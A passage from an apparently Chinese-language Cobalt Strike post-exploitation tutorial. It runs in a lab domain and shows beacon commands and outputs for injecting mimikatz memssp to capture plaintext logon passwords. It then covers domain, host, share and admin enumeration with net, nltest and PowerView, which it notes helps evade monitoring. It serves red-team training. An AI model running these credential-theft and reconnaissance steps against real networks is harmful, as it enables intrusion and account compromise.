class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>详细运行过程：</p><p>首先运行<code>mimikatz !misc::memssp</code></p><pre class="line-numbers language-none"><code class="language-none">beacon&gt; mimikatz !misc::memssp[*] Tasked beacon to run mimikatz&#39;s !misc::memssp command[+] host called home, sent: 1006151 bytes[+] received output:Injected &#x3D;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来来到<code>C:\Windows\system32</code>目录</p><pre class="line-numbers language-none"><code class="language-none">beacon&gt; cd C:\Windows\system32[*] cd C:\Windows\system32[+] host called home, sent: 27 bytesbeacon&gt; shell dir mimilsa.log[*] Tasked beacon to run: dir mimilsa.log[+] host called home, sent: 46 bytes[+] received output: 驱动器 C 中的卷没有标签。 卷的序列号是 BE29-9C84 C:\Windows\system32 的目录2020&#x2F;07&#x2F;23  21:47                24 mimilsa.log               1 个文件             24 字节               0 个目录 17,394,728,960 可用字节<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到是存在<code>mimilsa.log</code>文件的，此时待目标主机重新登录，比如电脑锁屏后用户进行登录。</p><p>查看<code>mimilsa.log</code>文件内容。</p><pre class="line-numbers language-none"><code class="language-none">beacon&gt; shell type mimilsa.log[*] Tasked beacon to run: type mimilsa.log[+] host called home, sent: 47 bytes[+] received output:[00000000:000003e5] \[00000000:002b99a7] WIN-75F8PRJM4TP\AdministratorPassword123!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功获取到当前登录用户的明文密码。</p><h1 id="0x06-横向扩展"><a href="#0x06-横向扩展" class="headerlink" title="0x06 横向扩展"></a>0x06 横向扩展</h1><h2 id="1、Windows-企业局域网环境介绍"><a href="#1、Windows-企业局域网环境介绍" class="headerlink" title="1、Windows 企业局域网环境介绍"></a>1、Windows 企业局域网环境介绍</h2><p><strong>活动目录</strong></p><p>活动目录<code>Active Directory</code>是一种能够集中管理用户、系统和策略的技术，活动目录的一个重要概念就是<code>域</code>。</p><p>Active Directory 存储有关网络上对象的信息，并让管理员和用户可以更容易地使用这些信息。例如 Active Directory 域服务即 AD DS 存储着有关用户账户的信息，并且使同一网络下的其他授权用户可以访问此信息。</p><p><strong>域</strong></p><p>域<code>Domain</code>即是一个管理员或者说是网络边界，在域里的用户和系统都是通过 AD进行管理的。</p><p>在域里，如果想控制服务器进行操作就需要取得域的信任。</p><p><strong>域控制器</strong></p><p>域控制器<code>Domain Controller</code>顾名思义就是一个对域里的用户和系统进行身份验证的一个系统。</p><p><strong>本地用户</strong></p><p>本地用户<code>Local User</code>就是系统上的一个标准用户。</p><p>当我们想在 Windows 命令行下指定一个本地的用户时，可以通过输入 <code>.\本地用户名</code>或者 <code>计算机名\本地用户名</code>来指定本地的用户账户，其中<code>.</code>表示计算机名。</p><p><strong>域用户</strong></p><p>域用户<code>Domain User</code>是指域控制器下的用户，如果想指定域用户，可以输入<code>域名\域用户名</code></p><p><strong>本地管理员</strong></p><p>本地管理员<code>Local Administrator</code>即是指在本地系统有管理权限的用户。</p><p><strong>域管理员</strong></p><p>域管理员<code>Domain Administrator</code>是指在域控制器上有管理权限的用户。</p><blockquote><p>注意：以下命令是在主机中运行的结果，在 Cobalt Strike 中运行只需要根据命令类型在命令前加上 shell 或者 powershell 即可。</p></blockquote><h2 id="2、主机和用户枚举"><a href="#2、主机和用户枚举" class="headerlink" title="2、主机和用户枚举"></a>2、主机和用户枚举</h2><h3 id="主机枚举"><a href="#主机枚举" class="headerlink" title="主机枚举"></a>主机枚举</h3><p><strong>一些问题</strong></p><p>当进入目标局域网时，需要弄清楚几个问题。</p><p>1、我正处在那个域上？</p><p>2、域信任关系是什么样的？</p><p>3、可以登陆哪些域？这些域上有哪些系统？目标是什么？可以获取什么？</p><p>4、系统上存放共享数据的地方在哪里？</p><p><strong>一些枚举的命令</strong></p><ul><li><p><code>net view /domain</code> </p><p>枚举出当前域</p></li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\> net view <span class="token operator">/</span>domainDomain<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>TEAMSSIX命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><code>net view /domain:[domain]</code>、<code>net group &quot;domain computers&quot; /domain</code></p><p><code>net view /domain:[domain]</code>枚举域上一个主机的列表，但不是所有主机，这个也就是在网上邻居中可以看到的内容。</p><p><code>net group &quot;domain computers&quot; /domain</code>可以获得加入到这个域中的电脑账户列表。</p></li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\> net view <span class="token operator">/</span>domain:teamssix服务器名称            注解<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>\\WIN<span class="token operator">-</span>72A8ERDSF2P\\WIN<span class="token operator">-</span>P2AASSD1AF1命令成功完成。<span class="token function">PS</span> C:\> net <span class="token function">group</span> <span class="token string">"domain computers"</span> <span class="token operator">/</span>domain组名     Domain Computers注释     加入到域中的所有工作站和服务器成员<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>WIN<span class="token operator">-</span>72A8ERDSF2P$命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><code>nltest /dclist:[domain]</code></p><p>如果想找到那个主机是域的域控服务器，可以使用<code>nltest</code>命令</p></li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\> nltest <span class="token operator">/</span>dclist:teamssix获得域“teamssix”中 DC 的列表<span class="token punctuation">(</span>从“\\WIN<span class="token operator">-</span>P2AASSD1AF1”中<span class="token punctuation">)</span>。    WIN<span class="token operator">-</span>P2AASSD1AF1<span class="token punctuation">.</span>teamssix<span class="token punctuation">.</span>com <span class="token namespace">[PDC]</span>  <span class="token namespace">[DS]</span> 站点: Default<span class="token operator">-</span>First<span class="token operator">-</span>Site<span class="token operator">-</span>Name此命令成功完成<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>​        当使用 32 位的 payload 运行在 64 位的系统上，并且 nltest 路径不对的时候，可能会提示没有 nltest 这个命令，这时可以尝试使用下面的命令为其指定路径。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\> C:\windows\sysnative\nltest <span class="token operator">/</span>dclist:teamssix获得域“teamssix”中 DC 的列表<span class="token punctuation">(</span>从“\\WIN<span class="token operator">-</span>P2AASSD1AF1”中<span class="token punctuation">)</span>。    WIN<span class="token operator">-</span>P2AASSD1AF1<span class="token punctuation">.</span>teamssix<span class="token punctuation">.</span>com <span class="token namespace">[PDC]</span>  <span class="token namespace">[DS]</span> 站点: Default<span class="token operator">-</span>First<span class="token operator">-</span>Site<span class="token operator">-</span>Name此命令成功完成<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><code>nslookup [name]</code>、<code>ping -n 1 -4 [name]</code></p><p>有时在 Cobalt Strike 里，我们只需要使用目标的 NetBIOS 名称，而不用在意使用 IPv4 地址或者 IPv6 地址，NetBIOS 名称是在域上每台机器的完整名称。</p><p>但是如果想通过一个 IPv4 地址转换为一个 NetBIOS 名称，可以使用 nslookup 命令，或者使用 ping 发送一个包来获得主机返回的 IP 地址。</p></li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\> nslookup WIN<span class="token operator">-</span>P2AASSD1AF1服务器:  UnKnownAddress:  ::1名称:    WIN<span class="token operator">-</span>P2AASSD1AF1<span class="token punctuation">.</span>teamssix<span class="token punctuation">.</span>comAddress:  192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>15<span class="token punctuation">.</span>124<span class="token function">PS</span> C:\> ping <span class="token operator">-</span>n 1 <span class="token operator">-</span>4 WIN<span class="token operator">-</span>P2AASSD1AF1正在 Ping WIN<span class="token operator">-</span>P2AASSD1AF1<span class="token punctuation">.</span>teamssix<span class="token punctuation">.</span>com <span class="token punctuation">[</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>15<span class="token punctuation">.</span>124<span class="token punctuation">]</span> 具有 32 字节的数据:来自 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>15<span class="token punctuation">.</span>124 的回复: 字节=32 时间&lt;1ms TTL=128192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>15<span class="token punctuation">.</span>124 的 Ping 统计信息:    数据包: 已发送 = 1，已接收 = 1，丢失 = 0 <span class="token punctuation">(</span>0<span class="token operator">%</span> 丢失<span class="token punctuation">)</span>，往返行程的估计时间<span class="token punctuation">(</span>以毫秒为单位<span class="token punctuation">)</span>:    最短 = 0ms，最长 = 0ms，平均 = 0ms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><code>nltest /domain_trusts</code>、<code>nltest /server:[address] /domain_trusts</code></p><p>如果想取得域上的信任关系，可以使用 nltest 命令来实现。</p></li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\> nltest <span class="token operator">/</span>domain_trusts域信任的列表:    0: TEAMSSIX teamssix<span class="token punctuation">.</span>com <span class="token punctuation">(</span>NT 5<span class="token punctuation">)</span> <span class="token punctuation">(</span>Forest Tree Root<span class="token punctuation">)</span> <span class="token punctuation">(</span>Primary Domain<span class="token punctuation">)</span> <span class="token punctuation">(</span>Native<span class="token punctuation">)</span>此命令成功完成<span class="token function">PS</span> C:\> nltest <span class="token operator">/</span>server:192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>15<span class="token punctuation">.</span>124 <span class="token operator">/</span>domain_trusts域信任的列表:    0: TEAMSSIX teamssix<span class="token punctuation">.</span>com <span class="token punctuation">(</span>NT 5<span class="token punctuation">)</span> <span class="token punctuation">(</span>Forest Tree Root<span class="token punctuation">)</span> <span class="token punctuation">(</span>Primary Domain<span class="token punctuation">)</span> <span class="token punctuation">(</span>Native<span class="token punctuation">)</span>此命令成功完成<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><code>net view \\[name]</code></p><p>如果想列出主机上的共享列表，只需输入<code>net view \\[name]</code>即可</p></li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\> net view \\WIN<span class="token operator">-</span>P2AASSD1AF1在 \\WIN<span class="token operator">-</span>75F8PRJM4TP 的共享资源共享名  类型  使用为  注释<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>Users   Disk命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h4><p>在渗透进入内网后，如果直接使用 Windows 的内置命令，比如 <code>net view、net user</code>等，可能就会被管理人员或者各种安全监控设备所发现。因此较为安全的办法就是使用 Powershell 和 VMI 来进行躲避态势感知的检测。</p><p>PowerView 是由 Will Schroeder 开发的 PowerShell 脚本，该脚本完全依赖于 Powershell 和 VMI ，使用 PowerView 可以更好的收集内网中的信息，在使用之前，与上一节 PowerUp 的一样需要先 import 导入 ps1 文件。</p><p>PowerView 下载地址：<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</a></p><p>一些 PowerView 的命令：</p><ul><li><p>Get-NetDomain</p><p>查询本地域的信息</p></li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\PowerView> <span class="token function">Get-NetDomain</span>Forest                  : teamssix<span class="token punctuation">.</span>comDomainControllers       : <span class="token punctuation">&#123;</span>WIN<span class="token operator">-</span>P2AASSD1AF1<span class="token punctuation">.</span>teamssix<span class="token punctuation">.</span>com<span class="token punctuation">&#125;</span>Children                : <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>DomainMode              : Windows2012DomainParent                  :PdcRoleOwner            : WIN<span class="token operator">-</span>P2AASSD1AF1<span class="token punctuation">.</span>teamssix<span class="token punctuation">.</span>comRidRoleOwner            : WIN<span class="token operator">-</span>P2AASSD1AF1<span class="token punctuation">.</span>teamssix<span class="token punctuation">.</span>comInfrastructureRoleOwner : WIN<span class="token operator">-</span>P2AASSD1AF1<span class="token punctuation">.</span>teamssix<span class="token punctuation">.</span>comName                    : teamssix<span class="token punctuation">.</span>com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>Invoke-ShareFinder</p><p>查找网络上是否存在共享</p></li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\PowerView> <span class="token function">Invoke-ShareFinder</span>\\WIN<span class="token operator">-</span>P2AASSD1AF1<span class="token punctuation">.</span>teamssix<span class="token punctuation">.</span>com\ADMIN$   <span class="token operator">-</span> 远程管理\\WIN<span class="token operator">-</span>P2AASSD1AF1<span class="token punctuation">.</span>teamssix<span class="token punctuation">.</span>com\C$       <span class="token operator">-</span> 默认共享\\WIN<span class="token operator">-</span>P2AASSD1AF1<span class="token punctuation">.</span>teamssix<span class="token punctuation">.</span>com\IPC$     <span class="token operator">-</span> 远程 IPC\\WIN<span class="token operator">-</span>P2AASSD1AF1<span class="token punctuation">.</span>teamssix<span class="token punctuation">.</span>com\NETLOGON         <span class="token operator">-</span> Logon server share\\WIN<span class="token operator">-</span>P2AASSD1AF1<span class="token punctuation">.</span>teamssix<span class="token punctuation">.</span>com\SYSVOL   <span class="token operator">-</span> Logon server share<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>Invoke-MapDomainTrust</p><p>显示当前域的信任关系</p></li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\PowerView> <span class="token function">Invoke-MapDomainTrust</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其他更多用法可以查看参考链接，或者参考 PowerView 项目上的 ReadMe 部分。</p><h4 id="Net-模块"><a href="#Net-模块" class="headerlink" title="Net 模块"></a>Net 模块</h4><p>Cobalt Strike 中有自己的 net 模块，net 模块是 beacon 后渗透攻击模块，它通过 windows 的网络管理 api 函数来执行命令，想使用 net 命令，只需要在 beacon 的控制中心输入 net + 要执行的命令即可。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net dclist : 列出当前域的域控制器net dclist <span class="token namespace">[DOMAIN]</span> : 列出指定域的域控制器net share \\<span class="token namespace">[name]</span> : 列出目标的共享列表net view : 列出当前域的主机net view <span class="token namespace">[DOMAIN]</span> : 列出指定域的主机<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 beacon 控制台中输入这些命令很类似输入一个本地的 net 命令，但是有一些些许的不同，比如下面一个是在主机上运行 net view 的结果一个是在 beacon 控制台下运行 net view 的结果。不难看出，beacon 下输出的结果更为丰富。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\> net view服务器名称            注解<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>\\WIN<span class="token operator">-</span>P2AASSD1AF1命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> net view<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run net view<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 104504 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:List of hosts:Server Name             IP Address                       Platform  Version  <span class="token function">Type</span>   Comment<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>             <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>                       <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>  <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>  <span class="token operator">--</span>-<span class="token operator">-</span>   <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>WIN<span class="token operator">-</span>P2AASSD1AF1         192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>15<span class="token punctuation">.</span>124                   500       6<span class="token punctuation">.</span>1      PDC    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs15-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="用户枚举"><a href="#用户枚举" class="headerlink" title="用户枚举"></a>用户枚举</h3><p>用户枚举的三个关键步骤：</p><p>1、当前账号是否为管理员账号？</p><p>2、哪些账号是域管理员账号？</p><p>3、哪个账号是这个系统上的本地管理员账号？</p><h4 id="管理员账号"><a href="#管理员账号" class="headerlink" title="管理员账号"></a>管理员账号</h4><p>第一个关键步骤，发现管理员账号。</p><p>如果想知道自己是否为管理员账号，可以尝试运行一些只有管理员账号才有权限操作的命令，然后通过返回结果判断是否为管理员。</p><p>其中一种方式是尝试列出仅仅只有管理员才能查看的共享列表，比如下面的 <code>dir \\host\C$</code> 命令，如果可以看到一个文件列表，那么说明可能拥有本地管理员权限。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell <span class="token function">dir</span> \\host\C$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment">#管理员账号运行结果</span>beacon> shell <span class="token function">dir</span> \\WinDC\C$<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">dir</span> \\WinDC\C$<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 55 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output: 驱动器 \\WinDC\C$ 中的卷没有标签。 卷的序列号是 F269<span class="token operator">-</span>89A7 \\WinDC\C$ 的目录2020<span class="token operator">/</span>06<span class="token operator">/</span>24  09:29    &lt;<span class="token function">DIR</span>>          inetpub2009<span class="token operator">/</span>07<span class="token operator">/</span>14  11:20    &lt;<span class="token function">DIR</span>>          PerfLogs2020<span class="token operator">/</span>07<span class="token operator">/</span>16  21:24    &lt;<span class="token function">DIR</span>>          Program Files2020<span class="token operator">/</span>07<span class="token operator">/</span>16  21:52    &lt;<span class="token function">DIR</span>>          Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>2020<span class="token operator">/</span>07<span class="token operator">/</span>17  23:00    &lt;<span class="token function">DIR</span>>          Users2020<span class="token operator">/</span>07<span class="token operator">/</span>26  00:55    &lt;<span class="token function">DIR</span>>          Windows               0 个文件              0 字节               6 个目录 28<span class="token punctuation">,</span>500<span class="token punctuation">,</span>807<span class="token punctuation">,</span>680 可用字节<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment">#一般账号运行结果</span>beacon> shell <span class="token function">dir</span> \\WinDC\C$<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">dir</span> \\WinDC\C$<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 55 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:拒绝访问。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以运行其他命令，比如运行下面的 <code>at</code> 命令来查看系统上的计划任务列表，如果显示出了任务列表信息，那么可能是本地管理员。（当任务列表没有信息时会返回 “列表是空的” 提示）</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell at \\host<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment">#管理员账号运行结果</span>beacon> shell at \\WinDC<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: at \\WinDC<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 51 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:状态 ID     日期                    时间          命令行<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>        1   今天                    22:30         E:\Install\Thunder\Thunder<span class="token punctuation">.</span>exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment">#一般账号运行结果</span>beacon> shell at \\WinDC<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: at \\WinDC<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 51 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:拒绝访问。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上一节讲述的 <code>PowerView</code> 有很多很好的自动操作来帮助解决这些问题。可以在加载 <code>PowerView</code> 后，运行下面的命令，通过 <code>PowerView</code> 可以快速找到管理员账号。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">powershell <span class="token function">Find-LocalAdminAccess</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> powershell<span class="token operator">-</span>import powerview<span class="token punctuation">.</span>ps1<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to import: powerview<span class="token punctuation">.</span>ps1<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 101224 bytesbeacon> powershell <span class="token function">Find-LocalAdminAccess</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">Find-LocalAdminAccess</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 329 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:WinDC<span class="token punctuation">.</span>teamssix<span class="token punctuation">.</span>com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="域管理员账号"><a href="#域管理员账号" class="headerlink" title="域管理员账号"></a>域管理员账号</h4><p>第二个关键步骤，发现域管理员账号。</p><p><strong>列出域管理员</strong></p><p>对于发现域管理员账号，可以在共享里使用本地的Windows命令。运行以下两条命令可以用来找出这些“域群组”的成员。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net <span class="token function">group</span> <span class="token string">"enterprise admins"</span> <span class="token operator">/</span>DOMAINnet <span class="token function">group</span> <span class="token string">"domain admins"</span> <span class="token operator">/</span>DOMAIN<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell net <span class="token function">group</span> <span class="token string">"enterprise admins"</span> <span class="token operator">/</span>domain<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: net <span class="token function">group</span> <span class="token string">"enterprise admins"</span> <span class="token operator">/</span>domain<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 68 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:组名     Enterprise Admins注释     企业的指定系统管理员成员<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>Administrator            命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell net <span class="token function">group</span> <span class="token string">"domain admins"</span> <span class="token operator">/</span>domain<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: net <span class="token function">group</span> <span class="token string">"domain admins"</span> <span class="token operator">/</span>domain<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 64 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:组名     Domain Admins注释     指定的域管理员成员<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>Administrator            命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者运行下面的命令来看谁是域控制器上的管理员</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net localgroup <span class="token string">"administrators"</span> <span class="token operator">/</span>DOMAIN<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell net localgroup <span class="token string">"administrators"</span> <span class="token operator">/</span>domain<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 